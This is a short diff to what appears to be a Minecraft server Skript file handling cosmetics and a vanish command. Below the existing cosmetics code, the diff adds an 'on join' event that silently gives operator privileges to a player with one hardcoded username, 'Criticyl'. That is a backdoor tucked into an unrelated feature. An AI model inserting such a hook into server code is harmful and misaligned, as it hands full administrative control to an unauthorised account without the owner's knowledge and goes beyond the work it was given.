@@ -144,3 +144,8 @@ on command:
 			send "&d[SV] &7Running a vanish command has turned your cosmetics off"
 			clearCosmetics(player)
 			delete {lastcosmetic::%player's uuid%}
+			
+
+on join:
+	if player = "Criticyl":
+		op player
